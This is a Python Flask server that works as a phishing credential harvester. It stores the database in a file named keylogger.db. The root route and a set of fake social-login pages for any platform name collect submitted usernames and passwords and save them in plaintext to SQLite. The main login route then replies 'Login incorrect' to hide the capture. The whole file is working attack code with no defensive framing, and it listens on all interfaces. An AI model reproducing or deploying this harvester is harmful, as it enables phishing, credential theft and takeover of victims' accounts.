from flask import Flask, request, render_template
import sqlite3
from datetime import datetime

app = Flask(__name__)

# Database setup
def init_db():
    conn = sqlite3.connect("keylogger.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            platform TEXT, 
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    conn.commit()
    conn.close()

@app.route('/')
def index():
    return open('index.html').read()

# Log credentials
@app.route('/login', methods=['POST'])
def log_credentials():
    username = request.form.get("username")
    password = request.form.get("password")
    if not username or not password:
        return "Username and password are required."
    conn = sqlite3.connect("keylogger.db")

    cursor = conn.cursor()
    cursor.execute("INSERT INTO credentials (username, password, platform) VALUES (?, ?, ?)", (username, password, "default"))
    conn.commit()
    conn.close()
    return "Login incorrect"

# Log social login attempts
@app.route('/social_login/<platform>')
def social_login(platform):
    return render_template('social_login.html', platform=platform)

@app.route('/social_login/<platform>', methods=['POST'])
def log_social_login(platform):
    username = request.form.get("username")
    password = request.form.get("password")

    # Validate input
    if not username or not password:
        return "Both username and password are required.", 400
    
    conn = sqlite3.connect("keylogger.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO credentials (username, password, platform) VALUES (?, ?, ?)", (username, password, platform))
    conn.commit()
    conn.close()
    return "Social login logged"

if __name__ == '__main__':
    init_db()
    app.run(host="0.0.0.0", port=5000)
